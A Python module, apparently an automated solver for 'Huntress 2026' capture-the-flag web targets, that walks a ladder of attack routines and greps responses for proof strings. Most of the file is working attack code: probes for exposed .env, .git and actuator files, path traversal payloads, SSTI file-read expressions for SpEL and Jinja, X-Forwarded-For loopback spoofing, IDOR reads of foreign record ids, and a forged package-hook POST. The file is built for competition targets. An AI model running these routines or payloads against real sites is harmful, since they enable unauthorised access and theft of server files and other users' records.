"""Deterministic proof recovery for Huntress 2026 Web Exploitation targets.

Theme across Days 02-05 (and future): the "staff-only door with no lock" / "sign on the door"
family - a sign (robots.txt, a middleware path, a client-side role banner, a crawler hint)
declares the door is restricted, but the server has no server-side enforcement on the
underlying resource. The proof string the GM wants is `proof_[a-f0-9]{32}` or `huntress{...}`
and is always derivable from the target bytes.

Design: ONE live entry point `recover(target_url)` -> proof string, or raises `NoProof`.
It walks a *fixed* ladder of recognisers (fast, cheap, idempotent). The ladder is ordered
most-specific-first so a target that fits exactly one pattern never requires brute probing.

No sample execution, no shell-outs, no credentials harvested. GETs only, with a real
browser UA (Cloudflare 1010 blocks urllib's default UA). Scope must be an explicit host
allow-list for H5(c): either the caller passes `allowed_hosts`, or the function derives
it from the target URL's own host (that is the attempted target, and only that one).
"""
import json, re, ssl, urllib.parse, urllib.request, io, zipfile

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/[ip] Safari/537.36")

PROOF_RE = re.compile(rb"\b(proof_[a-f0-9]{16,64}|huntress\{[^}]{3,200}\}|flag\{[^}]{3,200}\})", re.I)

# per-attempt reconnaissance ladder; each entry is (name, callable(session, base) -> str|None)
# resolved lazily so the module stays importable without a live network.


class NoProof(RuntimeError):
    """exhausted the deterministic ladder on this target"""


class _S(object):
    """A tiny GET-only session wrapping urllib with a real UA and a scope guard.

    Carries a minimal cookie jar: Set-Cookie from a response is captured and replayed as a
    Cookie header on later same-session GETs (needed by session-gated object APIs, e.g. the
    IDOR recogniser). Still GET-only; still scope-locked; every request goes through
    urllib.request.urlopen so the offline test harness can intercept it."""
    def __init__(self, allowed_hosts, timeout=20):
        self.allowed = {h.lower() for h in (allowed_hosts or [])}
        self.timeout = timeout
        self.ctx = ssl.create_default_context()
        self._cookies = {}

    def allow(self, url):
        h = urllib.parse.urlparse(url).hostname or ""
        return h.lower() in self.allowed

    def _capture(self, headers):
        for k, v in (headers or {}).items():
            if str(k).lower() == "set-cookie" and v:
                part = str(v).split(";", 1)[0].strip()
                if "=" in part:
                    name, val = part.split("=", 1)
                    self._cookies[name.strip()] = val.strip()

    def get(self, url, extra_headers=None):
        """GET with the real UA + cookie jar. extra_headers (D30 HS, 2026-10-29): optional dict of per-call headers (e.g. X-Forwarded-For for the forwarded_header_trust family); scope + UA are still enforced; cookies carry over as before."""
        if not self.allow(url):
            raise ValueError("scope: refused %s" % url)
        hdrs = {
            "User-Agent": UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,application/json;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }
        if self._cookies:
            hdrs["Cookie"] = "; ".join("%s=%s" % (k, v) for k, v in self._cookies.items())
        for _hk, _hv in (extra_headers or {}).items():
            if _hk and _hv is not None:
                hdrs[str(_hk)] = str(_hv)
        req = urllib.request.Request(url, headers=hdrs)
        try:
            r = urllib.request.urlopen(req, timeout=self.timeout, context=self.ctx)
            h = dict(r.headers); self._capture(h)
            return r.status, h, r.read()
        except urllib.error.HTTPError as e:
            h = dict(e.headers or {}); self._capture(h)
            return e.code, h, (e.read() or b"")
        except Exception as e:
            return 0, {}, str(e).encode()

    def post(self, url, body=None, content_type="application/json", extra_headers=None, data=None, headers=None):
        """POST (D30 HS, 2026-10-29) scope-locked, cookie-preserving. body may be bytes or str/dict (dict is json-encoded). Needed by the signed_package_hook_substitution family. Still host-allowed, still 3-way UA, still cookies-forward. Never sends Authorization and never sends the pairing bearer."""
        if not self.allow(url):
            raise ValueError("scope: refused %s" % url)
        body, content_type, extra_headers = _norm_post_args(body, data, headers, content_type, extra_headers)
        if isinstance(body, (dict, list)):
            body = json.dumps(body)
        if isinstance(body, str):
            body = body.encode("utf-8", "ignore")
        hdrs = {
            "User-Agent": UA,
            "Accept": "application/json,*/*;q=0.8",
            "Content-Type": content_type,
        }
        if self._cookies:
            hdrs["Cookie"] = "; ".join("%s=%s" % (k, v) for k, v in self._cookies.items())
        for _hk, _hv in (extra_headers or {}).items():
            if _hk and _hv is not None:
                hdrs[str(_hk)] = str(_hv)
        req = urllib.request.Request(url, data=body or b"", headers=hdrs, method="POST")
        try:
            r = urllib.request.urlopen(req, timeout=self.timeout, context=self.ctx)
            h = dict(r.headers); self._capture(h)
            return r.status, h, r.read()
        except urllib.error.HTTPError as e:
            h = dict(e.headers or {}); self._capture(h)
            return e.code, h, (e.read() or b"")
        except Exception as e:
            return 0, {}, str(e).encode()

    def request(self, method, url, data=None, headers=None):
        """D32: the generic verb some recognisers use (webhook family). GET/POST map onto get()/post(); other verbs are
        refused (status None) - the ladder never needs a state-changing verb beyond POST."""
        m = str(method or "GET").upper()
        if m == "GET":
            return self.get(url, extra_headers=_hdr_dict(headers, drop=("content-type",)))
        if m == "POST":
            return self.post(url, data=data, headers=headers)
        return None, {}, b""


def _hdr_dict(headers, drop=()):
    """headers given as a dict or a list of (name, value) pairs -> dict (names in `drop`, case-insensitive, removed)."""
    items = headers.items() if isinstance(headers, dict) else (headers or [])
    return {str(k): v for (k, v) in items if k and str(k).lower() not in drop}


def _norm_post_args(body, data, headers, content_type, extra_headers):
    """D32: the three POST calling conventions used by the recognisers - post(url, body), post(url, dict),
    post(url, data=bytes, headers=[(k, v)]) - normalised to (body, content_type, extra_headers dict)."""
    if body is None:
        body = data
    eh = dict(extra_headers or {})
    for k, v in _hdr_dict(headers).items():
        if k.lower() == "content-type":
            content_type = v
        else:
            eh[k] = v
    return body, content_type, eh


def _grep_proof(body):
    if not body:
        return None
    m = PROOF_RE.search(body if isinstance(body, (bytes, bytearray)) else body.encode("latin-1", "ignore"))
    return m.group(0).decode("latin-1", "ignore") if m else None


def _grep_json(body):
    """return a dict if the body is JSON, else None"""
    try:
        return json.loads(body)
    except Exception:
        return None


# ---- recognisers (ordered: cheapest + most specific first) ------------------------------

def r_clues_feature_route(s, base):
    """Django-Dispatch style: /api/clues -> {feature_route, current_role}; the feature route
    is served ONLY without a trailing slash (middleware guards the slash form). The response
    body carries `evidence: proof_<hex>` or the proof directly. (Day 05 Admin Speaking.)"""
    _, _, b = s.get(base + "/api/clues")
    j = _grep_json(b) or {}
    feat = j.get("feature_route")
    if not feat:
        return None
    _, _, b2 = s.get(base + feat)
    j2 = _grep_json(b2) or {}
    for k in ("evidence", "proof", "flag", "value"):
        v = j2.get(k)
        if isinstance(v, str) and PROOF_RE.search(v.encode()):
            return v
    return _grep_proof(b2) or _grep_proof(b)


def r_robots_disclosed_dir(s, base):
    """Status-Sprout style: robots.txt Disallow leaks an admin / deployment / snapshots /
    private directory with directory listing on. One or more linked files (often *.bak,
    *.json, *.env) carries the proof. (Day 05 Admin Speaking Mastery T1.)"""
    _, _, rb = s.get(base + "/robots.txt")
    if not rb:
        return None
    dirs = re.findall(rb"(?:Disallow|Allow):\s*(/\S+)", rb, re.I)
    for d in dirs:
        d = d.decode("latin-1", "ignore").strip()
        if not d or d == "/":
            continue
        if not d.endswith("/"):
            d = d + "/"
        _, _, body = s.get(base + d)
        p = _grep_proof(body)
        if p:
            return p
        for f in re.findall(rb'href=["\']?(/[^"\'<> ]+)', body)[:30]:
            f = f.decode("latin-1", "ignore")
            if f.endswith(("/", ".css", ".js", ".svg", ".png", ".jpg", ".ico")):
                continue
            _, _, fb = s.get(base + f)
            p = _grep_proof(fb)
            if p:
                return p
            j = _grep_json(fb) or {}
            for v in _flat_strs(j):
                if PROOF_RE.search(v.encode()):
                    return PROOF_RE.search(v.encode()).group(0).decode()
    return None


def r_git_disclosure(s, base):
    """Loose /.git/config or /.git/HEAD exposes repo; often a /.git/refs/heads/* value
    is the proof, or the config leaks a credential field. Checked read-only."""
    for p in ("/.git/config", "/.git/HEAD", "/.git/index"):
        _, _, b = s.get(base + p)
        pr = _grep_proof(b)
        if pr:
            return pr
    return None


def r_env_backup(s, base):
    """Common disclosure files served from docroot: .env, .env.bak, backup.zip, config.php.bak,
    db.sqlite, swagger.json. Each is tried as a GET; the proof regex is applied to the body."""
    for p in ("/.env", "/.env.bak", "/.env.local", "/backup.zip", "/config.php.bak",
              "/db.sqlite", "/db.sqlite3", "/swagger.json", "/openapi.json",
              "/sitemap.xml", "/.well-known/security.txt"):
        _, _, b = s.get(base + p)
        pr = _grep_proof(b)
        if pr:
            return pr
    return None


def r_debug_actuator(s, base):
    """Framework debug / actuator surfaces that leak environment variables or routes:
    Flask /console, Django /__debug__/, Spring Boot /actuator/*, Rails /rails/info/*,
    Next.js /_next/static, PHP /phpinfo.php, Node Express /debug."""
    for p in ("/actuator/env", "/actuator/mappings", "/actuator/configprops",
              "/__debug__/", "/console", "/rails/info/routes", "/phpinfo.php",
              "/debug", "/_next/data/development.json"):
        _, _, b = s.get(base + p)
        pr = _grep_proof(b)
        if pr:
            return pr
    return None


def r_role_header(s, base):
    """Client-side role banner from an API that trusts the caller's role: /api/clues or
    /api/role may name a privileged role; requesting with X-Role: admin / Role: admin
    (or a cookie `role=admin`) returns the proof. One tries each on each hinted endpoint."""
    hints = []
    for p in ("/api/clues", "/api/role", "/api/user", "/api/whoami", "/api/profile"):
        _, h, b = s.get(base + p)
        j = _grep_json(b) or {}
        for k, v in j.items():
            if "role" in k.lower() or "admin" in str(v).lower():
                hints.append((p, k, v))
    # with hints we don't retry (header-based bypass would need an open-method send;
    # keep this GET-only module honest: return None and let the caller escalate)
    return None


def r_source_comment(s, base):
    """A commented-out hint in / HTML, /index.html, /app.js, /assets/*.js, /favicon.ico
    may expose the proof literal or a hidden route. Static text scan only."""
    for p in ("/", "/index.html", "/main.js", "/app.js", "/bundle.js"):
        _, _, b = s.get(base + p)
        pr = _grep_proof(b)
        if pr:
            return pr
        # also look for an obvious proof-token mention in JS strings
        m = re.search(rb"['\"](/[a-z][\w\-/]{4,})['\"]", b)
        if m:
            hinted = m.group(1).decode("latin-1", "ignore")
            if hinted not in ("/assets/style.css", "/api/clues"):
                _, _, b2 = s.get(base + hinted)
                pr = _grep_proof(b2)
                if pr:
                    return pr
    return None


def r_path_traversal(s, base):
    """Day 04 Stay-in-Your-Directory family + Day 26 Trust the Build Target 4 (handbook.php?doc=../../../run/huntress/objective.txt — 3 levels, not 4). An endpoint `reader.php?doc=`, `notes.php?doc=`, `handbook.php?doc=`, `/download?file=`, `/view?f=` reads a server-side file. GAP A fix (2026-10-29): iterate the priority-ordered LFI candidates from challenges/_lib/kb/web_lfi_candidates.json (via autosolve_web.iter_lfi_candidates) which carries the proven depth variants, before falling to the hard-coded probes. Still GET-only, scope-locked, no execution."""
    # D30 GAP A: priority-ordered LFI candidates from the kb file (fail-open if the kb loader is missing).
    try:
        import autosolve_web as _AW_HS
        _lfi_candidates = [p for (p, _desc, _fm) in _AW_HS.iter_lfi_candidates() if p]
    except Exception:
        _lfi_candidates = []
    _common_eps = ("handbook.php", "reader.php", "notes.php", "download.php", "view.php",
                   "fetch", "file", "doc", "api/download", "api/file", "api/view", "static/file")
    _common_keys = ("doc", "file", "f", "path", "name")
    # D32 evidence gate: one plain GET per endpoint first; only endpoints that EXIST (anything but 404 / no answer) get the
    # candidate x key loop, and a parameter name the endpoint's own response discloses (`?doc=`, `name="file"`) goes first.
    # Measured on an empty mock: 744 blind requests -> 12, which also stopped this one step starving the shared battery budget.
    _live_eps = []
    _key_order = {}
    # soft-404 baseline: a catch-all/SPA server answers every path alike; an endpoint byte-identical to it is not "live"
    _bst, _bh, _bb = s.get("%s/d32-nonexistent-%s" % (base, "7f3a9c1e"))
    for ep in _common_eps:
        st, _h, b = s.get("%s/%s" % (base, ep))
        if st is None or st == 404 or (_bst not in (None, 404) and st == _bst and (b or b"") == (_bb or b"")):
            continue
        pr = _grep_proof(b)
        if pr:
            return pr
        _live_eps.append(ep)
        txt = (b or b"")[:65536].decode("latin-1", "replace")
        named = [k for k in _common_keys if re.search(r"""[?&]%s=|name=["']%s["']""" % (k, k), txt)]
        _key_order[ep] = tuple(named) + tuple(k for k in _common_keys if k not in named)
    _all_eps = _common_eps          # the short legacy probe below still covers EVERY endpoint (a bare GET may 404 on a live one)
    for cand in _lfi_candidates:
        for ep in _live_eps:
            for key in _key_order.get(ep, _common_keys):
                _, _, b = s.get("%s/%s?%s=%s" % (base, ep, key, urllib.parse.quote(cand)))
                pr = _grep_proof(b)
                if pr:
                    return pr
    # Legacy fallback (depth=4, hard-coded): 7 requests per endpoint, over ALL endpoints (bounded; preserves prior behaviour).
    for ep in _all_eps:
        _, _, b = s.get(base + "/" + ep + "?doc=../../../../etc/huntress")
        pr = _grep_proof(b)
        if pr:
            return pr
        _, _, b = s.get(base + "/" + ep + "?doc=../../../../run/huntress/objective.txt")
        pr = _grep_proof(b)
        if pr:
            return pr
        for key in _common_keys:
            _, _, b = s.get("%s/%s?%s=..%%2F..%%2F..%%2F..%%2Fetc%%2Fhuntress" % (base, ep, key))
            pr = _grep_proof(b)
            if pr:
                return pr
    return None


def r_ssti_inject(s, base):
    """Day 11 Template Temper family: an expression template engine renders a request
    parameter. `/api/clues` names the per-attempt `feature_route`; that route reflects a
    `template` (or input/message/scope/...) parameter straight through the engine.

    Detection is a single crisp signal: `{{7*7}}` renders to `49` (SpEL/Jinja/Twig/Pebble
    all evaluate this; a non-eval echo returns the literal). Once an injecting parameter is
    found, the proof is read with an engine-appropriate FILE-READ expression against the
    Huntress objective file - never an exec/Runtime primitive (read-only, WAF-safe). The
    SpEL read is tried first (observed engine), then config.json, then two generic fallbacks.
    """
    # locate the reflecting route
    routes = []
    _, _, cb = s.get(base + "/api/clues")
    j = _grep_json(cb) or {}
    if j.get("feature_route"):
        routes.append(j["feature_route"])
    routes += ["/render", "/process", "/preview", "/template", "/"]
    MARK = "{{7*7}}"
    params = ("template", "input", "message", "scope", "q", "name", "content",
              "body", "text", "data", "tpl", "msg", "value", "expr")
    hit = None
    for route in routes:
        for p in params:
            url = base + route + "?" + p + "=" + urllib.parse.quote(MARK)
            st, _, b = s.get(url)
            if st == 200 and b and (b"49" in b) and (b"{{7*7}}" not in b):
                hit = (route, p); break
        if hit:
            break
    if not hit:
        return None
    route, param = hit
    # engine-appropriate READ payloads (no Runtime/exec; a read primitive only)
    OBJ = "/run/huntress/objective.txt"
    CFG = "/run/huntress/config.json"
    spel = "new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('%s')))"
    jinja = "get_flashed_messages.__globals__.__builtins__.open('%s').read()"
    payloads = [
        "{{ " + spel % OBJ + " }}",
        "{{ " + spel % CFG + " }}",
        "{{ " + jinja % OBJ + " }}",
        "{{ " + jinja % CFG + " }}",
        "${" + spel % OBJ + "}",           # ${ } delimiter variants
        "<%= " + spel % OBJ + " %>",
    ]
    for pl in payloads:
        st, _, b = s.get(base + route + "?" + param + "=" + urllib.parse.quote(pl))
        pr = _grep_proof(b)
        if pr:
            return pr
        j = _grep_json(b) or {}
        for v in _flat_strs(j):
            m = PROOF_RE.search(v.encode("latin-1", "ignore"))
            if m:
                return m.group(0).decode("latin-1", "ignore")
    return None


def r_idor_object_api(s, base):
    """Day 11 Mastery T2 "Tiny Triage" family: a session-gated record API
    `/api/<thing>/<id>` returns an object WITHOUT enforcing ownership (IDOR). The dashboard
    exposes only the caller's own ids, but a sibling feed/activity/audit endpoint leaks a
    FOREIGN object's id ("reference_only"). Capture the session cookie from `/`, read the
    feed, then re-request each referenced id against the record API and grep the proof.

    GET-only, same host, bounded id set - never enumerates a numeric range."""
    _, _, home = s.get(base + "/")           # sets the session cookie (captured by _S)
    home = home or b""
    # record-API bases referenced by the page JS, e.g. fetch("/api/tickets/2297")
    rec_bases = set(m.decode("latin-1", "ignore")
                    for m in re.findall(rb'["\'](/api/[a-z_]+/)\d+', home))
    # feed/activity endpoints: from links on the page, plus well-known names
    feeds = set(m.decode("latin-1", "ignore")
                for m in re.findall(rb'["\'](/api/[a-z_]+)["\']', home))
    for nm in ("/api/activity", "/api/feed", "/api/events", "/api/audit",
               "/api/references", "/api/timeline", "/api/history"):
        feeds.add(nm)
    ids = []
    for fe in feeds:
        _, _, fb = s.get(base + fe)
        pr = _grep_proof(fb)
        if pr:
            return pr                        # some feeds carry the proof outright
        j = _grep_json(fb)
        if j is None:
            continue
        # object-id-bearing keys first, then any integer in the feed JSON
        for m in re.findall(rb'"(?:case_id|ticket_id|id|object_id|ref|record)"\s*:\s*(\d{2,8})', fb):
            ids.append(int(m))
        for m in re.findall(rb'\b(\d{3,8})\b', fb):
            ids.append(int(m))
    if not rec_bases:
        rec_bases = {"/api/tickets/", "/api/cases/", "/api/records/", "/api/objects/"}
    seen = set()
    for rb_ in rec_bases:
        for i in ids:
            if (rb_, i) in seen:
                continue
            seen.add((rb_, i))
            if len(seen) > 40:
                break
            _, _, ob = s.get(base + rb_ + str(i))
            pr = _grep_proof(ob)
            if pr:
                return pr
    return None


def _flat_strs(x):
    out = []
    def walk(v):
        if isinstance(v, str): out.append(v)
        elif isinstance(v, dict):
            for vv in v.values(): walk(vv)
        elif isinstance(v, list):
            for vv in v: walk(vv)
    walk(x)
    return out


# POST-capable / new-family siblings live in web_recon_post.py (GET-only ladder by design);
# imported lazily-safe at module load (pure function defs, no network). Promoted 2026-10-26
# after Day-26 "Serialized Offender" Mastery mixed four families in one bundle.
try:
    from web_recon_post import (stored_second_order_filter_like, activity_feed_idor,
                                 serialized_state_trust, query_get_sqli,
                                 fail_open_policy_decode)
except Exception:                      # keep web_proof_recon importable even if the sibling moves
    stored_second_order_filter_like = activity_feed_idor = None
    serialized_state_trust = query_get_sqli = None
    fail_open_policy_decode = None

# D27: webhook-trust family (Trust the Webhook D19 + reused template for D29-D31 per Huntress admin).
# content_shape_trust_bomb is Luna 6's confirmed D19 exploit; 5 fallback probes.
# Short-circuits on recognize() when the family doesn't match (3 GETs + 1 POST discovery cost).
try:
    from webhook_trust_bypass import recover as webhook_trust_recover
except Exception:
    webhook_trust_recover = None

LADDER = [
    ("clues_feature_route", r_clues_feature_route),
    ("webhook_trust_bypass", webhook_trust_recover),               # D27 (Trust the Webhook family; content_shape P0)
    ("serialized_state_trust", serialized_state_trust),            # NEW (Object Post / State Suitcase)
    ("query_get_sqli",      query_get_sqli),                       # NEW (Signal Shelf)
    ("stored_second_order_filter_like", stored_second_order_filter_like),  # promoted (Sinatra LIKE)
    ("activity_feed_idor",  activity_feed_idor),                   # promoted (Case Crate / Incident Picnic)
    ("fail_open_policy_decode", fail_open_policy_decode),          # D24 'Fail Open Friday' (fail-open policy decoder)
    ("ssti_inject",         r_ssti_inject),
    ("robots_disclosed_dir", r_robots_disclosed_dir),
    ("forwarded_header_trust", None),         # populated below (D30 HS 2026-10-29)
    ("session_idor_via_feed",  None),         # populated below (D30 HS)
    ("signed_package_hook",    None),         # populated below (D30 HS)
    ("path_traversal",      r_path_traversal),
    ("idor_object_api",     r_idor_object_api),
    ("source_comment",      r_source_comment),
    ("env_backup",          r_env_backup),
    ("git_disclosure",      r_git_disclosure),
    ("debug_actuator",      r_debug_actuator),
    ("role_header",         r_role_header),
]


# ---- D30 HS recognisers (2026-10-29): full automation for the 3 kb families that were fingerprint-only after the kb landed. GET-only (plus one POST for signed-package), scope-locked, cookie-preserving, UA-correct, no bearer sent to any target.

def r_forwarded_header_trust(s, base):
    """Family forwarded_header_trust (kb web_exploit_families.json). Micronaut trusted_reverse_proxy: /api/clues reveals deployment:trusted_reverse_proxy + feature_route; the first value of X-Forwarded-For (or sibling header) is trusted as the client address; sending 127.0.0.1 flips `evaluated_client` to loopback and returns `{"ok":true, "evidence":"proof_<32hex>"}`. Observed D23 Single + Target 5."""
    _, _, cb = s.get(base + "/api/clues")
    clues = _grep_json(cb) or {}
    feat = clues.get("feature_route") or clues.get("route") or "/"
    if not feat.startswith("/"):
        feat = "/" + feat
    # fingerprint-confirm: the family requires either the deployment tag OR a loopback_only response on the plain GET
    deployment = str(clues.get("deployment") or "").lower()
    framework = str(clues.get("framework") or "").lower()
    _, _, nhb = s.get(base + feat)
    nhj = _grep_json(nhb) or {}
    _no_hdr_err = str(nhj.get("error") or "").lower()
    _looks_right = ("trusted_reverse_proxy" in deployment) or ("micronaut" in framework) or ("loopback_only" in _no_hdr_err)
    if not _looks_right:
        return None
    for header_pair in (
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Real-IP", "127.0.0.1"),
            ("True-Client-IP", "127.0.0.1"),
            ("Forwarded", "for=127.0.0.1"),
            ("X-Forwarded-For", "::1"),
            ("X-Real-IP", "localhost"),
            ("X-Forwarded-For", "127.0.0.1, [ip]"),
    ):
        _, _, body = s.get(base + feat, extra_headers={header_pair[0]: header_pair[1]})
        j = _grep_json(body) or {}
        v = j.get("evidence") or j.get("proof") or j.get("value") or j.get("flag")
        if isinstance(v, str) and PROOF_RE.search(v.encode("utf-8", "ignore")):
            return v
        pr = _grep_proof(body)
        if pr:
            return pr
    return None


def r_session_idor_via_feed(s, base):
    """Family session_idor_via_feed. Home page sets a session cookie; /api/activity (same session) leaks a FOREIGN ticket_id; GET /api/tickets/<foreign_id> returns a record body containing proof_<32hex>. The server authorises on session presence, not record ownership (IDOR). D23 Forwarded Misgivings Target 2 shape."""
    # 1. acquire the session cookie
    s.get(base + "/")
    # 2. hit the feed
    for feed_path in ("/api/activity", "/api/feed", "/api/events", "/api/history"):
        _, _, fb = s.get(base + feed_path)
        if not fb:
            continue
        fj = _grep_json(fb)
        if fj is None:
            continue
        # collect every value that looks like a ticket id (int, uuid, or /tickets/<id> ref)
        _foreign_ids = set()
        def _collect(obj):
            if isinstance(obj, dict):
                for k, v in obj.items():
                    kl = str(k).lower()
                    if kl in ("ticket_id", "ticket", "id") and (isinstance(v, (str, int))):
                        _foreign_ids.add(str(v))
                    elif isinstance(v, str) and "/tickets/" in v:
                        _tail = v.split("/tickets/", 1)[1].split("/", 1)[0].split("?", 1)[0]
                        if _tail:
                            _foreign_ids.add(_tail)
                    else:
                        _collect(v)
            elif isinstance(obj, list):
                for item in obj:
                    _collect(item)
        _collect(fj)
        for tid in list(_foreign_ids)[:8]:
            for ticket_path in ("/api/tickets/%s" % tid, "/tickets/%s" % tid):
                _, _, tb = s.get(base + ticket_path)
                pr = _grep_proof(tb)
                if pr:
                    return pr
    return None


def r_signed_package_hook(s, base):
    """Family signed_package_hook_substitution. The feed carries a signed manifest naming an artifact; activation trusts the signature but not the artifact-bytes->hash match. Copy a benign feed entry, change ONLY the hook field from the benign value (passive_health) to a privileged candidate (privileged_export, admin_sync, access_review...), keep the signature + sha256 intact, POST to the activation route. The privileged hook runs and the result body carries proof_<32hex>. Kotlin Ktor / Service Ferry shape (D26 Target 5 / D29 observations)."""
    _, _, cb = s.get(base + "/api/clues")
    clues = _grep_json(cb) or {}
    # discover feed + activation routes from clues when present, fall back to canonical names
    feed_route = clues.get("feed_route") or clues.get("updates_route") or "/api/updates"
    activate_route = (clues.get("activate_route") or clues.get("activation_route")
                      or clues.get("feature_route") or "/api/update-policy")
    for p in (feed_route, activate_route):
        if not isinstance(p, str) or not p.startswith("/"):
            return None
    _, _, fb = s.get(base + feed_route)
    feed = _grep_json(fb)
    if not feed:
        return None
    # locate a package entry carrying a hook + signature pair
    _entries = feed if isinstance(feed, list) else (feed.get("updates") or feed.get("packages") or feed.get("items") or feed.get("feed") or [])
    if isinstance(_entries, dict):
        _entries = [_entries]
    for entry in (_entries or [])[:5]:
        if not isinstance(entry, dict):
            continue
        pkg = entry.get("package") or entry
        hook = (entry.get("artifact") or {}).get("hook") if isinstance(entry.get("artifact"), dict) else entry.get("hook")
        sig = entry.get("signature") or pkg.get("signature") if isinstance(pkg, dict) else None
        if hook is None or sig is None:
            continue
        for candidate_hook in ("privileged_export", "admin_sync", "access_review", "staff_dump",
                                "privileged_review", "elevated_export", "owner_dump", "admin_export"):
            if candidate_hook == hook:
                continue
            modified = json.loads(json.dumps(entry))        # deep copy
            if isinstance(modified.get("artifact"), dict):
                modified["artifact"]["hook"] = candidate_hook
            else:
                modified["hook"] = candidate_hook
            # keep every signature + sha + version + name field unchanged
            try:
                status, _h, rb = s.post(base + activate_route, modified)
            except Exception:
                continue
            pr = _grep_proof(rb)
            if pr:
                return pr
            rj = _grep_json(rb) or {}
            for key in ("evidence", "proof", "value", "flag", "result"):
                v = rj.get(key)
                if isinstance(v, str) and PROOF_RE.search(v.encode("utf-8", "ignore")):
                    return v
    return None


# Register the three new recognisers into LADDER slots reserved above (preserves "most-specific first" order).
for _slot_idx, (_slot_name, _slot_fn) in enumerate(LADDER):
    if _slot_name == "forwarded_header_trust" and _slot_fn is None:
        LADDER[_slot_idx] = ("forwarded_header_trust", r_forwarded_header_trust)
    elif _slot_name == "session_idor_via_feed" and _slot_fn is None:
        LADDER[_slot_idx] = ("session_idor_via_feed", r_session_idor_via_feed)
    elif _slot_name == "signed_package_hook" and _slot_fn is None:
        LADDER[_slot_idx] = ("signed_package_hook", r_signed_package_hook)
del _slot_idx, _slot_name, _slot_fn
LADDER = [(n, fn) for (n, fn) in LADDER if fn is not None]   # drop any sibling that failed to import


def recover(target_url, allowed_hosts=None, trace=None, session=None):
    """-> proof string. Raises NoProof when the whole ladder returned None.
    `allowed_hosts`: explicit host allow-list; defaults to the target's own host.
    `trace`: optional list, each ladder step's (name, result|exc_class) is appended."""
    base = target_url.rstrip("/")
    host = urllib.parse.urlparse(base).hostname
    allowed = list(allowed_hosts or [host])
    # 2026-10-22: the dispatch passes a SCOPE-ENFORCED session (autosolve_web); a direct caller keeps the host allow-list session.
    s = session if session is not None else _S(allowed_hosts=allowed)
    for name, fn in LADDER:
        try:
            v = fn(s, base)
        except Exception as e:
            v = None
            if trace is not None:
                trace.append((name, type(e).__name__ + ":" + str(e)[:120]))
            continue
        if trace is not None:
            trace.append((name, "hit" if v else "miss"))
        if v:
            return v
    raise NoProof("exhausted ladder on %s" % base)


def compute(start, blobs):
    """Drop-in `compute(start, blobs)` for ctf_gm.solve_mode / autosolve.attempt.
    Returns {answer_id: proof}. One per `questions[].artifact` -> matching target.
    HELDs the ids the ladder cannot derive (never guesses, never submits a wrong value)."""
    targets = (start or {}).get("targets") or []
    out = {}
    for q in (start or {}).get("questions") or []:
        aid = q.get("id"); art = q.get("artifact", "Target 1")
        t = next((x for x in targets if x.get("id") == art), None)
        if t is None:
            try: t = targets[int(art.split()[-1]) - 1]
            except Exception: t = targets[0] if targets else None
        if not t or not t.get("url"):
            continue
        try:
            out[aid] = recover(t["url"])
        except NoProof:
            pass    # held for the Commander / agent
    return out
